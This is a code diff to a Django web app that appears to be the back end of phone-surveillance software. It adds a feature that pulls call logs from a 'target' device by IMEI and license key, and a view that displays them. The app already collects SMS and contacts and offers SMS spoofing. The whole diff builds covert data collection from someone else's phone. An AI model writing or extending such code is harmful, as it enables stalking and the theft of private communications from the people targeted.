@@ -4,11 +4,11 @@ import json
 import uuid
 from inertia import render
 
-from authentication.tasks import fetch_contacts_socket, fetch_sms, send_email, send_websocket_sms
+from authentication.tasks import fetch_call_logs_socket, fetch_contacts_socket, fetch_sms, send_email, send_websocket_sms
 from .mixins import InertiaView
 from .forms import SignInForms, SignUpForms, SpoofSMSForm, SubscribeForm, TargetAliasNameForm
 from django.shortcuts import redirect
-from .models import Contacts, SMSMessages, User, Target
+from .models import CallLogs, Contacts, SMSMessages, User, Target
 from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
 from django.utils.encoding import force_bytes
 from django.contrib.auth.tokens import default_token_generator
@@ -335,6 +335,9 @@ class SyncTargetView(LoginRequiredMixin, InertiaView):
         elif sync_type == "contacts":
             fetch_contacts_socket.delay(target.id, target.device_imei, target.license_key)
             return redirect("contacts")
+        elif sync_type == "call_logs":
+            fetch_call_logs_socket.delay(target.id, target.device_imei, target.license_key)
+            return redirect("call-logs")
 
 class SpoofSMSView(LoginRequiredMixin, InertiaView):
     template_name = "SpoofSms"
@@ -380,4 +383,17 @@ class ContactsView(LoginRequiredMixin, InertiaView):
 
         return {
             "contacts": contacts
+        }
+
+class CallLogsView(LoginRequiredMixin, InertiaView):
+    template_name = "CallLogs"
+    login_url = "/signin"
+
+    def get_props(self):
+        user = self.request.user
+        target = Target.objects.get(status="active", user=user)
+        call_logs = CallLogs.objects.filter(target=target).order_by("date").values()
+
+        return {
+            "call_logs": call_logs
         }
